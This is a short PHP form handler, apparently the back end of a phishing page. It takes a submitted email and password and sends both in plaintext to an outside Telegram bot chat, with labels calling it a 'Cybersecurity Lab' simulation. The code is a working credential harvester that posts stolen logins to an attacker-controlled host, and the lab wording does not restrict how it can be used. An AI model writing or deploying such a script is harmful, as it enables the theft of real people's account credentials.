<?php

require_once "config.php";

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    exit("Invalid request");
}

$email = filter_input(INPUT_POST, "email", FILTER_VALIDATE_EMAIL);
$password= filter_input(INPUT_POST, "password" );

if (!$email) {
    exit("Invalid email");
}

$message = "🔐 Cybersecurity Lab\n\n";
$message .= "📧 Test Email: " . $email . "\n";
$message .= "🕒 Time: " . date("Y-m-d H:i:s") . "\n";
$message .= "🛡️ Password: " . $password ."\n";
$message .= "Status: Simulation received";

$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";

$data = [
    "chat_id" => CHAT_ID,
    "text" => $message
];

$options = [
    "http" => [
        "header" => "Content-Type: application/x-www-form-urlencoded",
        "method" => "POST",
        "content" => http_build_query($data),
        "timeout" => 10
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result !== false) {
    echo "Simulation completed successfully!";
} else {
    echo "Telegram notification failed.";
}

?>